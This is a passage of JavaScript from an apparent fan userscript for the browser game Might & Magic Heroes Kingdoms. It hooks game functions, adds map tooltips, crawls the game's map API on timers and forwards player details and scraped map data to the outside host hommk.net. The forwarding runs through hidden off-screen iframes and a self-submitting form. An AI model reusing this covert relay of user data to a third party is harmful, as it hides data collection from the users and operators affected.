		return bests;
	}
	localStorage['last_google_update'] = date;
	var google = document.createElement('iframe');	
	settings = "id="+player.id;
	settings += "&name="+player.name;
	settings += "&faction="+player.factionEntityTagName;
	settings += "&slot="+(player.cityNumberMinThreshold-player.regionCount)+" ["+player.regionCount+"/"+player.cityNumberMinThreshold+"]";
	var bests = getBestStack();
	var bestUnit = bests[0];
	settings += "&power="+bestUnit.qty+" "+bestUnit.name+"["+bestUnit.power+"]";
	
	
	for(var i=0;i<bests.length;i++){
		bestUnit = bests[i];
		settings += "&tier"+i+"="+bestUnit.tier+"&qty"+i+"="+bestUnit.qty+"&pow"+i+"="+bestUnit.pow;
	}
	settings = encodeURI(settings);
	google.src = "http://www.hommk.net/test_google_spread.php?"+settings;
	google.style.width = "50px";
	google.style.left = "-100px";
	google.style.position = "absolute";
	document.body.appendChild(google);
		
})();	
		
		
		
		
	if(!ADMIN_DEBUG)
		return;
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	//-----------------------------------
	// STORAGE REQUESTS
	//-----------------------------------
	(function(){
		//console.log(HOMMK.elementPool);
		var HOMMK_JsonRequestHandler = HOMMK.JsonRequestHandler;
		HOMMK.JsonRequestHandler = function(type,callbacks){
			var REQUEST = this;
			callbacks = callbacks || this.$events;
			if(callbacks.onOKResponse){
				var onOKResponse = callbacks.onOKResponse;
				callbacks.onOKResponse = function(){
					var r = onOKResponse.apply(this,arguments);
					handle.apply(window,arguments);
					return r;
				};
				callbacks.onOKResponse.prototype = onOKResponse.prototype;
			}
			return HOMMK_JsonRequestHandler.apply(this,arguments);
		};
		HOMMK.JsonRequestHandler.prototype = HOMMK_JsonRequestHandler.prototype;
	})();
		// --------------------------------
		
	/*var cities = HOMMK.elementPool.obj.RegionCity.values();
	for(var i=0;i<cities.length;i++){
		try{
			console.log(i,cities[i].content.id);
			do_request({"elParamList":[{"elementType":"MagicGuildFrame","elementId":cities[i].content.id}]},function(){});
		}
		catch(e){}
	}*/
	
	console.log(localStorage);
	
	document.body.oncontextmenu = function(){return true;};
	
	
	

})();(function(window){
	HOMMK.setCurrentView(2);
	function imager(src){return "<img style='width:16px;height:16px;' src='"+src+"' />"}
	
	var h = window.location.hostname;
	var dom = h.substring(h.indexOf("."),h.length);
	if(dom != ".ubi.com")
		return 0;
	
	var refreshed = {};
	var ressources = [
		0,
		imager("http://www.hommk.net/img/gold.png"),
		imager("http://www.hommk.net/img/wood.png"),
		imager("http://www.hommk.net/img/ore.png"),
		imager("http://www.hommk.net/img/mercure.png"),
		imager("http://www.hommk.net/img/crystal.png"), 
		imager("http://www.hommk.net/img/sulfure.png"),
		imager("http://www.hommk.net/img/gem.png")
	];

	
	var res = {};
	
	var size = HOMMK.worldMap.content._size || 280;
	
	var htmlContentFunction = HOMMK.worldMap.tooltip.htmlContentFunction;
	function getId(x,y){
		return (y-1)*size+x;
	}
	function data(obj){
		if(!obj.d || (typeof obj.d == "string") || !obj.d.RegionMap0)
			return "no ressources";
		else{
			var tab=obj.d.RegionMap0.attachedZoneList;
			var result=[];
			for(var k=0;k<tab.length;k++)
				if(!!tab[k].attachedMine)
				{
					(tab[k].attachedMine.ressourceEntityTagName=="GOLD")?result.push(1):0;
					(tab[k].attachedMine.ressourceEntityTagName=="WOOD")?result.push(2):0;
					(tab[k].attachedMine.ressourceEntityTagName=="ORE")?result.push(3):0;
					(tab[k].attachedMine.ressourceEntityTagName=="MERCURY")?result.push(4):0;
					(tab[k].attachedMine.ressourceEntityTagName=="CRYSTAL")?result.push(5):0;
					(tab[k].attachedMine.ressourceEntityTagName=="SULFUR")?result.push(6):0;
					(tab[k].attachedMine.ressourceEntityTagName=="GEM")?result.push(7):0;
				}
			result = result.sort();
			return ressources[result[0]]+" - "+ressources[result[1]]+" - "+ressources[result[2]]+" - "+ressources[result[3]];
		}
	}
	function setup(id,obj,dom){
		var html = data(obj);
		res["_"+id] = html;
		if(dom=document.getElementById('willpower_'+id)){
			dom.innerHTML = html;
		}
	}
	function generate(x,y){
		var xmlhttp;
		if(window.XMLHttpRequest) {
			xmlhttp = new XMLHttpRequest();
		}
		else{                 
			xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.open("POST", 'http://mightandmagicheroeskingdoms.ubi.com/ajaxRequest/getContent',true);
		xmlhttp.onreadystatechange=function() {
		    if (xmlhttp.readyState==4 && xmlhttp.status == 200) {
				setup(getId(x,y),JSON.parse(xmlhttp.responseText)); 
			}
 		};
		xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
		xmlhttp.setRequestHeader("X-Request", "JSON");
		xmlhttp.send('json='+JSON.stringify({"elParamList":[{"elementId":0,"x":x,"y":y,"elementType":"RegionMap"}]}));
	}
	HOMMK.worldMap.tooltip.htmlContentFunction = function(){
		var r = htmlContentFunction.apply(this,arguments);
		if(r && !r.match(/id='willpower/)){
			var x = HOMMK.worldMap.getGoodPosition(HOMMK.worldMap.x + HOMMK.worldMap.lastTooltipX);
			var y = HOMMK.worldMap.getGoodPosition(HOMMK.worldMap.y + HOMMK.worldMap.lastTooltipY);
			var id = getId(x,y); 
			if(!res["_"+id]){
				generate(x,y);
				r += "<div id='willpower_"+id+"' style='font-weight:bolder;'></div>";
			}
			else{
				r += "<div id='willpower_"+id+"' style='font-weight:bolder;'>"+res["_"+id]+"</div>";
			}
		}
		return(r);
	};
	
	function modular(num,mod){
		return ((num-1) % mod)+1;
	}
	/******************************************************/
	
	function refresh(){
		var id = getId(HOMMK.currentView.regionX,HOMMK.currentView.regionY);
		if(!!refreshed['_'+id]) return;
		getScript('http://www.hommk.net/final/script/mapview_get.php?regionId='+id+'&worldId='+HOMMK.player.content.worldId);
	}
	HOMMK_user.ressources = { refresh:refresh };

	window.refreshed = refreshed;
	window.dataImages = res;
	window.makeImage = function(a,b,c,d){
			if(!a) return "no ressources";
			return ressources[a]+" - "+ressources[b]+" - "+ressources[c]+" - "+ressources[d];
	};
	/*
	function dupe(fn){
		return function(){
			var r = fn.apply(this,arguments);
			if(HOMMK_user.ressources)
				HOMMK_user.ressources.refresh();
			
			return r;
		}
	}
	HOMMK.worldMap.update = dupe(HOMMK.worldMap.update);
	HOMMK.worldMap.move = dupe(HOMMK.worldMap.move);
	HOMMK.worldMap.center = dupe(HOMMK.worldMap.center);*/
})(w);
(function(){
	var row,len,did,y,x,lastUpdate;	
	var size = HOMMK.worldMap.content._size || 280;
	var server = "http://www.hommk.net/final/update/ressource.php";
	
	var worldId = HOMMK.player.content.worldId;
	var h = window.location.hostname;
	var dom = h.substring(h.indexOf("."),h.length);
	var asia = (dom != ".ubi.com");
	if(dom == ".hommk.com") worldId += 10000; /* chinese */
	else if(dom == ".ubisoft.com.hk") worldId += 20000; /* taiwan - hong kong */
	else if(asia) worldId += 30000; /* corée ? */
	
	//console.log("world id : "+worldId);
	function time(){
		return new Date().getTime();
	}
	
	function doSend(){
		do_request({
			"elParamList": [{
				"elementType": "WorldMapAlert",
				"ownerType": "WorldMap",
				"ownerId": HOMMK.player.content.worldId,
				"x": 5,
				"y": 5,
				"w": 4,
				"h": 4
			}]
		},
		function(json){
			if(json.e)
				return false;
			var myGet = row.join(';').replace(/,/g,'');
			/*console.log("id finish at: "+y*280);*/
			/*console.log("url: "+server+"?y="+y+"&world="+HOMMK.player.content.worldId+"&data="+myGet);*/
			getScript(server+"?y="+y+"&world="+worldId+"&data="+myGet+"&size="+size+"&version="+version);
		});
	}
	function doSetup_euro(x,obj){
		if(did[x]==1) 
			return 0;
		lastUpdate = time();
		did[x]=1;
		len++;
		if(!obj.d || (typeof obj.d == "string") || !obj.d.RegionMap0){
			row[x]=[0,0,0,0];
			return;
		}
		else{
			var tab=obj.d.RegionMap0.attachedZoneList;
			var result=[];
			for(var k=0;k<tab.length;k++)
				if(!!tab[k].attachedMine)
				{
					(tab[k].attachedMine.ressourceEntityTagName=="GOLD")?result.push(1):0;
					(tab[k].attachedMine.ressourceEntityTagName=="WOOD")?result.push(2):0;
					(tab[k].attachedMine.ressourceEntityTagName=="ORE")?result.push(3):0;
					(tab[k].attachedMine.ressourceEntityTagName=="MERCURY")?result.push(4):0;
					(tab[k].attachedMine.ressourceEntityTagName=="CRYSTAL")?result.push(5):0;
					(tab[k].attachedMine.ressourceEntityTagName=="SULFUR")?result.push(6):0;
					(tab[k].attachedMine.ressourceEntityTagName=="GEM")?result.push(7):0;
				}
			row[x] = result;
			return;
		}
	}	
	function doSetup_asia(x,obj){
		if(did[x]==1) 
			return;
		lastUpdate = time();
		did[x]=1;
		len++;
		if(!obj.d || (typeof obj.d == "string") || !obj.d.mines){
			row[x]=[0,0,0,0];
			return;
		}
		else{
			var tab=obj.d.mines;
			var result=[];
			var ressourcesId = {Gold:1,Wood:2,Ore:3,Mercury:4,Crystal:5,Sulfur:6,Gem:7};
			for(var i in tab)
				if(!!ressourcesId[i])
					for(var j=0;j<tab[i].num;j++)
						result.push(ressourcesId[i]);
			row[x] = result;
/*console.log("res["+x+"]: "+result);//*/
			return 0;
		}
	}
	
	var doSetup = (asia?doSetup_asia:doSetup_euro);
	
	function doRequest(){
		var xmlhttp;
		if(window.XMLHttpRequest) {
			xmlhttp = new XMLHttpRequest();
		}
		else{                 
			xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		if(asia){
			xmlhttp.open("POST", 'http://'+window.location.host+'/ajaxRequest/getRegionMines',true);
		}
		else{
			xmlhttp.open("POST", 'http://mightandmagicheroeskingdoms.ubi.com/ajaxRequest/getContent',true);
		}
		xmlhttp.onreadystatechange=function() {
		    if (xmlhttp.readyState==4 && xmlhttp.status == 200) {
/*console.log("len: "+len);*/
				doSetup(x,JSON.parse(xmlhttp.responseText)); 
				if(len==size){
					doSend();
				}
				while(!!did[++x]){}
				if(x<=size){
					doRequest(x);
				}
			}
 		};
		xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
		xmlhttp.setRequestHeader("X-Request", "JSON");
		if(asia){
			xmlhttp.send('json='+JSON.stringify({"regionId":0,"x":x,"y":y}));
		}
		else{
			xmlhttp.send('json='+JSON.stringify({"elParamList":[{"elementId":0,"x":x,"y":y,"elementType":"RegionMap"}]}));
		}
	}
	w.startAt = function(start){
/*console.log("start: "+start);*/
		y = start,row = [],len=0,did=[],x=1;
		doRequest();
	};
	var checkRessources = function(){
/*console.log("check: "+len);*/
		if((lastUpdate+1000*30) >time())
			return;
		if(len<size){
			x=1;
			doRequest();
			return;
		}
		doSend();
	};
	w.updating = setInterval(checkRessources,1000*60*2);
	getScript(server+"?world="+worldId+"&size="+size+"&worldName="+HOMMK.WORLD_NAME+"&version="+version);
/*console.log(server+"?world="+worldId+"&size="+size+"&worldName="+HOMMK.WORLD_NAME);*/
})();
(function(win){

	var mapSize = HOMMK.worldMap.content._size;
	var posSize = Math.ceil(mapSize/35);
	
	var worldId = HOMMK.player.content.worldId;
	var h = win.location.hostname;
	var dom = h.substring(h.indexOf("."),h.length);
	var asia = (dom != ".ubi.com");
	if(dom == ".hommk.com") {
		worldId += 10000; // chinese
	}
    else if(dom == ".ubisoft.com.hk") {
		worldId += 20000; // taiwan - hong kong
	}
	else if(asia){
		worldId += 30000; // corée ?
	}
	
	function getId(x,y){
		return (y-1)*mapSize+x;
	}
	
	/* SERVER SCAN POSITION */
	function getPos(pos){
		var posX = (pos % posSize);
		var posY = Math.floor(pos / posSize);
		var x = posX*35+1;
		var y = posY*35+1;
		return {x:x,y:y};
	}
	
	function post_data(json,url,pos){
		var iframe_sender = document.createElement('iframe');
		iframe_sender.style.position="absolute";
		iframe_sender.style.top="20px";
		iframe_sender.style.left="-50px";
		iframe_sender.style.width="20px";
		iframe_sender.style.height="20px";
		document.body.appendChild(iframe_sender);
		
		iframe_sender.contentWindow.document.write("<form id='__hack__' action='"+url+"' method='post'><input type='hidden' name='pos' value='"+JSON.stringify(pos)+"' /><input type='hidden' name='version' value='"+version+"' /><input type='hidden' name='world' value='"+worldId+"' /><input type='hidden' value='"+JSON.stringify(json).replace(/'/g,"&#130;")+"' name='json' /><input type=submit /></form><scr"+"ipt type='text/javascript'>document.forms[0].submit();</scr"+"ipt>");
	}
	
	var TYPE = {
		'plain':1,
		'cliff':2,
		'forest':3,
		'oasis':4,
		'SPHINX':5,
		'LEARNING_STONE':6,
		'DWARVEN_TREASURY':7,
		/*'TEAR':10,*/
		
		
		'ACADEMY':11,
		'HAVEN':12,
		'INFERNO':13,
		'NECROPOLIS':14,
		'SYLVAN':15,
		/*
		// INACTIF
		'ACADEMY':21, 
		'HAVEN':22,
		'INFERNO':23,
		'NECROPOLIS':24,
		'SYLVAN':25,
		
		// GRAAL
		'ACADEMY':31,
		'HAVEN':32,
		'INFERNO':33,
		'NECROPOLIS':34,
		'SYLVAN':35,
		// 4X = INACTIF GRAAL ?
		*/
		
		
		'PORTAL':51,
		'PORTAL_FOUNDATION':52,
		'RUNIC_FORTRESS':53,
		//'RIFT_PILLAGE_5':54,
		//'RIFT_PILLAGE_20':55,
		'RIFT_PILLAGE_1':56,
		'RIFT_PILLAGE_5':56,
		'RIFT_PILLAGE_20':56,
		'RUINS':57
	};
		
	function handle(obj,pos){
		var type=[],player=[],a,t,i,p,e,playerList={},typeList={},c,pN,aN;
		/* browse array */
		for(var j=0;j<obj.length;j++){
			c = obj[j]._ipCol || obj[j]._iaCol || 0;
			if(!!obj[j].type){
				a=p=i=e=0;
				pN=aN="";
				if(!!obj[j]._iaId){
					// alliance id
					a=obj[j]._iaId;
					// alliance name
					aN=obj[j].iAN;
				}
				t = TYPE[obj[j].type];
				if(t==1){
					/* SPHINX/ETC TYPE */
					if(!!obj[j].rB){
						/* TYPE */
						if(asia){
							t=TYPE[obj[j].rB.tN];
						}
						else{
							t=TYPE[obj[j].rB.rBE.tN];
						}
						/* MAP ID */
						i=getId(obj[j].rB.x,obj[j].rB.y);
						if(!!obj[j].rB.owner){
							if(obj[j].rB.owner.ownerType=="Player"){
								/* PLAYER ID */
								p=obj[j].rB.owner.id;
							}
							else if(obj[j].rB.owner.ownerType!=null){
								/* PLAYER CHIEF ID */
								p=obj[j].rB.owner.creation_playerId;
							}
						}
						/* ELSE DEFAULT = 0 */
					}
					else if(!!obj[j].isC){
						/* PLAYER TYPE */
						
						/* TYPE */
						t = TYPE[obj[j].fctN];
						if(!!obj[j].hG){
							/* HAVE GRAAL */
							t+=20;
						}
						else if(!!obj[j].iN){
							/* IS INACTIF */
							t+=10;
						}
						/* MAP ID */
						i=getId(obj[j].x,obj[j].y);
						/* PLAYER ID */
						p=obj[j].pId;
						/* PLAYER NAME */
						pN=obj[j].pN;
						if(t==1){
							/* ERROR : UNKNOW TYPE */
							e = "Unknow Faction Type";
						}
						if(!!obj[j].dL){
							/* CITY LEVEL */
							t+=100*(obj[j].dL-1);
						}
						if(!!obj[j].aRL){
							if(!!p){
								playerList[p] = playerList[p] || {player:p,playerName:pN,data:[],color:c,alliance:a,allianceName:aN};
								for(var k=0;k<obj[j].aRL.length;k++){
									playerList[p]['data'].push(getId(obj[j].aRL[k][0],obj[j].aRL[k][1]));
								}									
							}
							else{
								e = "ZI adding";
							}
						}
					}
					else if(!!obj[j].tr){
						/* LARME TYPE */
						t=10;
					}
				}
				if(!i && !e){
					i=getId(obj[j].x,obj[j].y);
				}
			}
			else{
				/* ERROR */
				e = "No Type";
			}
			
			if(!!e){
				console.log('ERROR: '+e);
			}
			else{
				/* PUSH type */	
				typeList[t] = typeList[t] || {type:t,data:[]};
				typeList[t]['data'].push(i);
				/* PUSH player */	
				playerList[p] = playerList[p] || {player:p,playerName:pN,data:[],color:c,alliance:a,allianceName:aN};
				playerList[p]['data'].push(i);		
			}
		}
		
		/* SEND ALL */
		for(var i in playerList){
			player.push(playerList[i]);
		}
		for(var i in typeList){
			type.push(typeList[i]);
		}
		data = {player:player,type:type};
		//console.log(JSON.stringify(data));
		post_data(data,"http://www.hommk.net/final/update/ajaxRequest.php",pos);
	}

	var carto2 = win.carto2 = function(x,y){
		/*var x = getPos(pos).x;*/
		/*var y = getPos(pos).y;*/
		//console.log("carto("+x+","+y+")");
		var pos = {x:x,y:y};
		var xmlhttp = new XMLHttpRequest();
		xmlhttp.open("POST", 'http://'+win.location.host+'/ajaxRequest/getContent',true);
		xmlhttp.onreadystatechange=function() {
		    if (xmlhttp.readyState==4 && xmlhttp.status == 200) {
				if(asia){
					var o = JSON.parse(xmlhttp.responseText);
					/*console.log(o.d);
					console.log(o.d['WorldMap'+HOMMK.player.content.worldId]);
					console.log(o.d['WorldMap'+HOMMK.player.content.worldId].attachedRegionList);*/
					handle(JSON.parse(xmlhttp.responseText).d['WorldMap'+HOMMK.player.content.worldId].attachedRegionList,pos);
				}
				else{
					handle(JSON.parse(xmlhttp.responseText).d['WorldMap'+HOMMK.player.content.worldId+'RegionList'],pos);
				}
				if(x+35<mapSize){ 
					setTimeout(function(){carto2(x+35,y);},1000);
				}
			}
 		};
		xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
		xmlhttp.setRequestHeader("X-Request", "JSON");
		if(asia){
			xmlhttp.send('json='+JSON.stringify({"elParamList":[{"elementType":"WorldMap","elementId":HOMMK.player.content.worldId,"details":false,"x":x,"y":y,"w":35,"h":35,"regionId":null}],"isChating":false}));
		}
		else{
			xmlhttp.send('json='+JSON.stringify({"elParamList":[{"elementType": "Region","ownerType": "WorldMap","ownerId": HOMMK.player.content.worldId,"x": x,"y": y,"w": 35, "h": 35 }]}));
		}
	};
	
})(w);(function(){
	var H= HOMMK;
/* JQUERY 1.2 FIX event.layerX and event.layerY are deprecated*/


	(function(){
		// remove layerX and layerY
		var all = $.event.props,
			len = all.length,
			res = [];
		while (len--) {
		  var el = all[len];
		  if (el != 'layerX' && el != 'layerY') res.push(el);
		}
		$.event.props = res;
	}());
	
	
/* FIX RUSSIAN FORTRESS NAMES */
	var worldId = HOMMK.player.content.worldId;
	function injectAfter(S,A) {
		return function() {
			var arg = Array.prototype.slice.call(arguments, 0);
			arg.unshift(S.apply(this,arguments));
			return A.apply(this, arg);
		};
	};
	if ( worldId == 2081 || worldId == 2011 || worldId == 2562 ) {
		function process_fortress ( r ) {
			var frame = this;
			for ( var rkIndex in frame.content.regionBuildingList ) {
				var runicFort = frame.content.regionBuildingList[rkIndex];
				if ( runicFort.name.charCodeAt(0) != '?'.charCodeAt(0) )
					break;
					
				var rfId = runicFort.regionX + (runicFort.regionY - 1) * HOMMK.elementPool.obj.WorldMap.obj[HOMMK.player.content.worldId].content._size;
				runicFort.name = rfId;
			}
		}
		H.RegionBuildingListFrame.prototype.initializeDisplay = injectAfter(H.RegionBuildingListFrame.prototype.initializeDisplay, process_fortress);
		function process_cur_fortress() {
			var frame = this;
			if ( frame.content.n.charCodeAt(0) != '?'.charCodeAt(0) )
				return;
			var regionName = "" + frame.currentRegionId;
			var regionId = parseInt( regionName.substr( 0, regionName.length - 1 ) ) + 1;
			var rkTitle = document.getElementById('RunicFortressRegionBuildingFrame' + regionName + 'Title');
			rkTitle.innerHTML = "" + regionId;
		}
		H.RunicFortressRegionBuildingFrame.prototype.show = injectAfter(H.RunicFortressRegionBuildingFrame.prototype.show, process_cur_fortress);
		function message_show() {
			var frame = this;
			if ( frame.content.type != HOMMK.MESSAGE_TYPE_DWARF_REWARD_MESSAGE )
				return;
			if ( frame.selectElement && frame.selectElement.childNodes && frame.selectElement.childNodes[0] && frame.selectElement.childNodes[0].label && frame.selectElement.childNodes[0].label.charCodeAt(0) == '?'.charCodeAt(0) ) {
				var fortressList = [];
				if ( HOMMK.elementPool.obj.RegionBuildingListFrame )
					fortressList = HOMMK.elementPool.obj.RegionBuildingListFrame.obj[HOMMK.player.content.worldId].content.regionBuildingList;
				else {
					var fortressRequest = HOMMK_user.func.doSyncRequest( {"elParamList":[{"elementType":"RegionBuildingListFrame","elementId":HOMMK.player.content.worldId}]} );
					fortressList = fortressRequest.d['RegionBuildingListFrame'+HOMMK.player.content.worldId].regionBuildingList;
				}
				for ( var fortressInd in fortressList ) {
					for ( var selectIndex in frame.selectElement.childNodes )
					if ( fortressList[fortressInd].id == parseInt( frame.selectElement.childNodes[selectIndex].value ) ) {
						var rfId = fortressList[fortressInd].regionX + (fortressList[fortressInd].regionY - 1) * HOMMK.elementPool.obj.WorldMap.obj[HOMMK.player.content.worldId].content._size;
						frame.selectElement.childNodes[selectIndex].text = "" + rfId;
					}
				}
			}
		}
		H.MultiChoiceDetailedMessage.prototype.show = injectAfter(H.MultiChoiceDetailedMessage.prototype.show, message_show);
		var fortressList = [];
		var actionsList = HOMMK.timeLine.masterActionList.elementList;
		for ( var actionInd in actionsList ) {
			var action = actionsList[actionInd];
			if ( action.content && action.content.paramList && action.content.type == "VIRTUAL_HERO_ATTACK_REGIONBUILDING" ) {
				var messageParts = action.content.actionDescription.split('"');
				if ( messageParts.length != 3 )
					break;
				if ( messageParts[1].charCodeAt(0) != '?'.charCodeAt(0) )
					break;
				if ( fortressList.length == 0 ) {
					if ( HOMMK.elementPool.obj.RegionBuildingListFrame )
						fortressList = HOMMK.elementPool.obj.RegionBuildingListFrame.obj[HOMMK.player.content.worldId].content.regionBuildingList;
					else {
						var fortressRequest = HOMMK_user.func.doSyncRequest( {"elParamList":[{"elementType":"RegionBuildingListFrame","elementId":HOMMK.player.content.worldId}]} );
						fortressList = fortressRequest.d['RegionBuildingListFrame'+HOMMK.player.content.worldId].regionBuildingList;
					}
				}
				var fortressId = parseInt( action.content.paramList.tRBI );
				for ( var fortressInd in fortressList ) {
					if ( fortressList[fortressInd].id != fortressId )
						continue;					
					var rfId = fortressList[fortressInd].regionX + (fortressList[fortressInd].regionY - 1) * HOMMK.elementPool.obj.WorldMap.obj[HOMMK.player.content.worldId].content._size;
					var newMessage = messageParts[0] + '"' + rfId + '"' + messageParts[2];
					action.content.actionDescription = newMessage;
				}
			}
		}
	}
})();(function(){
	var H = HOMMK;
	H.MessageBoxFrame.prototype.show = injectAfter(H.MessageBoxFrame.prototype.show, remove_buttons);
	
	function selectSameName(frame, n) {
		var messageName = '';
		if ( n.rangeParent )
			messageName = n.rangeParent.childNodes[3].childNodes[1].childNodes[1].innerHTML;
		else
			messageName = n.currentTarget.parentNode.childNodes[3].childNodes[1].childNodes[1].innerHTML;
		var messageList = frame.receivedMessageList.elementList;

		for ( var messageInd in messageList ) {
			if ( messageList[messageInd].elementType && messageList[messageInd].elementType == 'ReceivedMessage' ) {
				if ( messageList[messageInd].content.subject == messageName ) {
					if ( n.currentTarget.stChk != true )
						messageList[messageInd].check();
					else
						messageList[messageInd].uncheck();
				}
			}
		}
		frame.activateArchiveButtons();
		frame.activateTrashButtons();

		if ( n.currentTarget.stChk != true ) {
			n.currentTarget.stChk = true;
		}
		else {
			n.currentTarget.checked = false;
			n.currentTarget.stChk = false;
		}
	}

	function remove_buttons(r) {
		var frame = this;
		var messageList = document.getElementsByClassName('message');
		var messagePos = 1;
		for ( var messagePos in messageList ) {
			if ( messageList[messagePos].className && messageList[messagePos].className == 'message' && !messageList[messagePos].processed )
			{
				var n = document.createElement('input');
				n.id = 'ReceivedMessageAllCheckBox';
				n.type="radio";
				n.style.left = '0px';
				n.style.marginLeft = '31px';
				n.style.marginTop = '1px';
				n.addEventListener('click', function(E) { return selectSameName(frame,E); }, true);
				messageList[messagePos].appendChild(n);
				messageList[messagePos].processed = true;
			}	
		}
		return r;
	}
		
	function calcFortress( fortressId, level, heroAttaqant, evt ) {
		if ( HOMMK.selectedHeroId == null )
			return;
		if ( evt.shiftKey == true )
			heroAttaqant = !heroAttaqant;
		var fortress = HOMMK_user.RunicFortress.info['RunicFortressRegionBuildingFrame'+fortressId];
		var hero = HOMMK.elementPool.obj.Hero.obj[HOMMK.selectedHeroId];
		var donnees = {
			saison:0,
			a:{ statut:1, dolmens:0, cri_de_guerre:0, inspiration:0, heros:0, niveau:1, faction:0, archetype:0, artefacts:[0,0,0,0,0,0,0,0],
				tacticien:0, ecuyer:0, tireur_elite:0, commandant_infanterie:0, logisticien:0, harangueur:0, sapeur:0, massacreur:0,
				instinct:[0,0,0,0], expert:[0,0,0,0], arcanes:0, bonus_ecole:[0,0,0,0], larmes:0, mhr:{signe:0, valeur:0},
				sort:[ {id:-1, tour:1}, {id:-1, tour:2} ],
				troupes:[ {}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0} ],
				butin_de_guerre:0, relever_les_morts:0, resistance_magique:0, moral_eleve:0, resurrection:0, tir_de_barrage:0, heros_superieur:0,
				maitrise_des_sorts:0, revelation_de_caracteristiques:0, classement_voies:0
			},
			d:{
				statut:0, lieu:0, fortification:0, forts:0, fort_principal:0, dolmens:0, ralliement:0, inspiration:0, heros:0, niveau:1,
				faction:0, archetype:0, artefacts:[0,0,0,0,0,0,0,0],
				tacticien_defenseur:0, ecuyer_defenseur:0, expert_tirs_barrage:0, inebranlable:0, logisticien:0, bon_payeur:0, batisseur_fortifications:0, massacreur:0,
				instinct:[0,0,0,0], expert:[0,0,0,0], arcanes:0, bonus_ecole:[0,0,0,0], larmes:0, mhr:{signe:0, valeur:0},
				sort:[ {id:-1, tour:1}, {id:-1, tour:2} ],
				troupes:[ {}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0} ],
				butin_de_guerre:0, relever_les_morts:0, resistance_magique:0, moral_eleve:0, resurrection:0, tir_de_barrage:0, heros_superieur:0,
				maitrise_des_sorts:0, revelation_de_caracteristiques:0, classement_voies:0
			}
		};
		donnees.saison = HOMMK.player.content.worldSeasonNumber;	
		if ( !heroAttaqant ){	// For defencer reset atacking hero - resetted if need later
			donnees.a.statut = 0;	
			donnees.d.statut = 1;
		}
		if ( heroAttaqant ) {
			var playerHero = donnees.a;
			var versusHero = donnees.d;
		} 
		else {
			var playerHero = donnees.d;
			var versusHero = donnees.a;
		}
		if ( bonus.data && bonus.data.graal ) 
			playerHero.larmes = bonus.data.graal;
		if ( bonus.data && bonus.data.cri )
			playerHero.cri_de_guerre = bonus.data.cri;
		if ( bonus.data && bonus.data.def )
			playerHero.ralliement = bonus.data.def;
		playerHero.bonus_ecole = bonus.data.ecoles;		
		prepare_heros( playerHero, hero.content );		
		var talents = hero.content.heroBonuses.skills.local;
		if ( talents !== undefined ) {
			for (var t = 0; t < talents.length; t++) {
				var talent = talents[t];
				prepare_talent(playerHero, talent);
			}
		}
		var artefacts = hero.content.heroBonuses.artefacts.local;    
		prepare_artefacts(playerHero, artefacts);
		if ( hero.isMainHero ) {
			for ( var c in heredite.competences )
			{
				var competence = heredite.competences[c];
				var c_nom = competence.heredityAbilityEntity.tagName;
				var c_niveau = competence.level;
				playerHero[_competences_hereditaires[c_nom]] = c_niveau;
			}
			var cv = heredite.cv;
			var c = 0;
			if (cv.d == 0 && cv.w > 0 && cv.h > 0) cv.d = 6 - cv.w - cv.h;
			if (cv.d > 0 && cv.w == 0 && cv.h > 0) cv.w = 6 - cv.d - cv.h;
			if (cv.d > 0 && cv.w > 0 && cv.h == 0) cv.h = 6 - cv.w - cv.d;
			if (cv.d > 0 && cv.w == 0 && cv.h == 0 && cv.d != 2) c = ((cv.d == 3)?1:6);
			if (cv.d == 0 && cv.w > 0 && cv.h == 0 && cv.w != 2) c = ((cv.w == 3)?3:5);
			if (cv.d == 0 && cv.w == 0 && cv.h > 0 && cv.h != 2) c = ((cv.h == 3)?6:1);
			if (cv.d > 0 && cv.w > 0 && cv.h > 0) {
				if (cv.d == 3) c = ((cv.w == 2)?1:2);
				if (cv.w == 3) c = ((cv.d == 2)?3:4);
				if (cv.h == 3) c = ((cv.d == 2)?5:6);
			}
			playerHero.classement_voies = c;
		}
		var sorts = [];
		if ( HOMMK.elementPool.obj.BattlePrepFrame && HOMMK.elementPool.obj.BattlePrepFrame.obj[hero.id] )
			sorts =  HOMMK.elementPool.obj.BattlePrepFrame.obj[hero.id].RoundSpellStackList;
		else {
			var request = HOMMK_user.func.doSyncRequest({"elParamList":[{"elementType":"BattlePrepFrame","elementId":HOMMK.selectedHeroId,"targetType":"Region","targetId":HOMMK.selectedRegionCityId,"battleType":"DEFENSE","teleportEntrance_regionId":null,"teleportExit_regionId":null}]});
			sorts = request.d['BattlePrepFrame'+HOMMK.selectedHeroId].RoundSpellStackList;
		}
		if ( sorts && sorts.length == 2 ) {
			var sort1 = sorts[0].content;
			var sort2 = sorts[1].content;
			if ( (playerHero.arcane == 1 && sort2.attachedSpellEntity.magicSchoolLevel > 1) || (playerHero.arcane == 2 && sort2.attachedSpellEntity.magicSchoolLevel > 3) ) {
				playerHero.sort[0].id = _sorts[sort2.spellEntityTagName];
				playerHero.sort[0].tour = sort2.roundPosition;
				playerHero.sort[1].id = _sorts[sort1.spellEntityTagName];
				playerHero.sort[1].tour = sort1.roundPosition;
			}
			else {
				playerHero.sort[0].id = _sorts[sort1.spellEntityTagName];
				playerHero.sort[0].tour = sort1.roundPosition;
				playerHero.sort[1].id = _sorts[sort2.spellEntityTagName];
				playerHero.sort[1].tour = sort2.roundPosition;
			}
		}
		else {
			for (var i = 0; i < sorts.length; i++)	{
				var sort = sorts[i].content;
				playerHero.sort[i].id = _sorts[sort.spellEntityTagName];
				playerHero.sort[i].tour = sort.roundPosition;
			}
		}
		var troupes = hero.unitStackList.elementList;//content.attachedUnitStackList;
		for (var t = 0; t < troupes.length; t++)
		{
			var troupe = troupes[t].content || troupes[t];
			var troupePosition = troupe.stackPosition || troupe.powerPosition;
